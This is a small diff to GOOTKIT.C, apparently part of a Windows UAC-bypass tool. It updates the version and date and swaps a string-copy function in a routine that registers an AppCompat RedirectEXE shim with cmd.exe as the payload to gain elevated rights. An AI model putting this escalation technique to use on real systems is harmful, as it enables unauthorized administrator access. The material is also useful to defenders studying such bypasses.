@@ -4,9 +4,9 @@
 *
 *  TITLE:       GOOTKIT.C
 *
-*  VERSION:     1.30
+*  VERSION:     1.50
 *
-*  DATE:        30 Mar 2015
+*  DATE:        05 Apr 2015
 *
 *  Gootkit based AutoElevation using AppCompat.
 *
@@ -234,7 +234,7 @@ BOOL ucmAppcompatElevation(
 		}
 
 		//create and register shim with RedirectEXE, cmd.exe as payload
-		lstrcpyW(szBuffer, L"%systemroot%\\system32\\cmd.exe");
+		_strcpy_w(szBuffer, L"%systemroot%\\system32\\cmd.exe");
 		bResult = ucmDoFireworks(szBuffer);
 		
 	} while (cond);
